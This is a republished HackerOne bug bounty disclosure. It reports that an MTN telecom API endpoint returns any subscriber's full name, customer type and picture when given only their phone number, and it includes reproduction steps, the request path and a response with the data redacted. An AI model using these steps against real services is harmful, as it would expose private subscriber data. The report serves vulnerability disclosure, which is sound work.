# Information Disclosure Leads To User Data Leak

## Metadata
- **Source:** HackerOne
- **Report:** 1541660 | https://hackerone.com/reports/1541660
- **Submitted:** 2022-04-14
- **Reporter:** netboy
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
Information disclosure is when a web application fails to properly protect confidential information, which causes revealing sensitive information or data of the users or anything related to users to any third party.

## Summary:
Am able to get any MTN users data such as FULL NAME, CUSTOMER TYPE AND PICTURE.
I can get those data by using only phone number of any MTN users.
VUL URL: ████ 
VUL URL: █

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Information disclosure is when a web application fails to properly protect confidential information, which causes revealing sensitive information or data of the users or anything related to users to any third party.

## Summary:
Am able to get any MTN users data such as FULL NAME, CUSTOMER TYPE AND PICTURE.
I can get those data by using only phone number of any MTN users.
VUL URL: ████ 
VUL URL: █████
~NOTE: Tested with a █████████ phone number that belong to me.

## Steps To Reproduce:

  1. Visit `███` or `█████████`
  2. Put in a phone number and catch the request via BURP
  3. INTERCEPT  the request of `GET /vtu-service/api/pwa/pub/get-bio-data/081*******`
  4. The response contains Fullname, Customer Type and Picture of the user.

## Supporting Material/References:
VUL REQUEST:
```
GET /vtu-service/api/pwa/pub/get-bio-data/070******** HTTP/1.1
Host: █████████
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: ███
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: █████████
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
RESPONSE:
```
HTTP/1.1 200 OK
Date: ██████ ███████ GMT
Server: WildFly/10
X-Frame-Options: ████████, ██████, ███, ████████, █████████, ████
Access-Control-Allow-Credentials: âtrueâ, âtrueâ
Access-Control-Expose-Headers: origin, content-type, accept, Authorization,Access-Control-Allow-Origin, origin, content-type, accept, Authorization,Access-Control-Allow-Origin
Access-Control-Allow-Headers: Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods, Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method,Access-Control-Request-Headers, Authorization, Access-Control-Allow-Methods
X-XSS-Protection: 1; mode=block
Referrer-Policy: origin-when-cross-origin
Access-Control-Allow-Origin: *
X-Powered-By: Undertow/1
Content-Type: application/json
Cache-Control: max-age=0, public, no-cache, private, no-store
Expires: ██████████ █████ GMT
Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS
X-Content-Type-Options: nosniff
X-Content-Security-Policy: default-src 'self' *█████
Strict-Transport-Security: max-age=631138519; includeSubDomains
Feature-Policy: vibrate *; usermedia *; sync-xhr *
Access-Control-Allow-Methods: PUT, GET, POST, DELETE, OPTIONS
X-Content-Security-Policy: default-src 'self' *██████████
Feature-Policy: vibrate *; usermedia *; sync-xhr *
Connection: close
Content-Length: 295017

{"responseCode":"00","responseDescription":"Successful","firstname":"EXPOSE","lastname":"EXPOSE","othername":"EXPOSE","customerType":"Prepaid","profileImg":"EXPOSE"}
```
NOTE: I replaced the exposed data with EXPOSE.

## Impact

An attacker can retrieve any users data (like full name, Customer Type, and Picture) by just using the victim phone number.
This can be use for information gathering about someone for malicious use or criminal activity.

</details>

---
*Analysed by Claude on 2026-05-24*
